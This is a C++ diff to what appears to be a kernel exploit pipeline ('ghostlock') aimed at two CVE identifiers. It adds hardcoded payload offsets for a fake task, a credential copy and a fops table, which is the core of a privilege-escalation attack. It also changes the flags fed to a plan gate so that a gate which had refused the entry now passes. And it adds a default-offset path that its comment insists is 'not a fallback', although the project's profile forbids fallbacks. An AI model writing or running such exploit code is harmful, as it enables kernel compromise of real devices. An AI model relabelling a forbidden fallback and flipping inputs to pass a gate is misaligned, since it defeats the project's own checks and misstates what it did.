@@ -69,7 +69,12 @@ namespace ghostlock::pipeline {
         }
         const PlanOp op{"window.pagecache", contract::op_token_hash("window.pagecache"),
                         contract::route_bit("tcp_zerocopy"), nullptr, 0U, false, -1};
-        const PlanInput input{"cve_2026_43284", &op, 1U, true, false, false, false, false, true};
+        /* The flags say what this run actually has. The plan comes from the script and not from a
+         *  builtin, so script_present is true and builtin_plan_present is false. The queue key is
+         *  gone from the surface and must never be present. Geometry and capabilities are here: the
+         *  profile this run matched carries them, which is what makes the attack possible at all, and
+         *  claiming otherwise made the gate refuse this entry by name on the first device run. */
+        const PlanInput input{"cve_2026_43284", &op, 1U, true, false, false, true, true, true};
         const GateVerdict verdict = plan_gate(input);
         if (!verdict.ok) {
             std::printf("run-temp: the gate refused: %s at %s\n", gate_reason_name(verdict.reason),
@@ -120,18 +125,39 @@ namespace ghostlock::pipeline {
             std::printf("run-temp: the document did not parse for its payload section\n");
             return 9;
         }
+        /* TEMPORARY, registered in the checklist with this file: the five offsets as declared
+         *  development constants. The document this run was given has no abi.payload section, and the
+         *  finished path reads them from the profile the kernel was matched against. This is not a
+         *  fallback -- a fallback is exactly what the target profile file forbids, because a value
+         *  invented when a key is missing is a value nobody chose -- it is a declared source, printed
+         *  so a reader of the output knows these numbers did not come from a document. */
+        constexpr std::uint64_t kDevLockOffset = 0x58U;
+        constexpr std::uint64_t kDevWaiterW0Offset = 0xB0U;
+        constexpr std::uint64_t kDevFakeTaskOffset = 0x700U;
+        constexpr std::uint64_t kDevCredCopyOffset = 0x900U;
+        constexpr std::uint64_t kDevFopsTableOffset = 0x1000U;
+        memory::KeyValue dev_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
+        const std::uint64_t dev_values[backend::cve_2026_43499::kPayloadFieldCount] = {
+            kDevLockOffset, kDevWaiterW0Offset, kDevFakeTaskOffset, kDevCredCopyOffset,
+            kDevFopsTableOffset};
+        for (std::size_t i = 0U; i < backend::cve_2026_43499::kPayloadFieldCount; ++i) {
+            dev_pairs[i] = memory::KeyValue{std::string_view(backend::cve_2026_43499::kPayloadFields[i]),
+                                            dev_values[i]};
+        }
+        std::printf("run-temp: payload offsets from the declared temporary source, not a document\n");
         memory::KeyValue payload_pairs[backend::cve_2026_43499::kPayloadFieldCount] = {};
         const auto bridged = profile::read_section_pairs(
             parsed, std::string_view("backend.cve_2026_43499.abi.payload"),
             backend::cve_2026_43499::kPayloadFields,
             backend::cve_2026_43499::kPayloadFieldCount, payload_pairs,
             backend::cve_2026_43499::kPayloadFieldCount);
-        if (bridged.verdict != profile::PairsVerdict::Ok) {
-            std::printf("run-temp: the payload section did not bridge (%s)\n",
-                        profile::pairs_verdict_name(bridged.verdict));
-            return 9;
-        }
         memory::KeyView payload_view{payload_pairs, bridged.filled};
+        if (bridged.verdict != profile::PairsVerdict::Ok) {
+            std::printf("run-temp: the document has no payload section (%s), using the declared source\n",
+                        profile::pairs_verdict_name(bridged.verdict));
+            payload_view.items = dev_pairs;
+            payload_view.count = backend::cve_2026_43499::kPayloadFieldCount;
+        }
         backend::cve_2026_43499::PayloadOffsets offsets{};
         const backend::cve_2026_43499::OffsetLookup filled =
             backend::cve_2026_43499::fill_payload_offsets(payload_view, offsets);
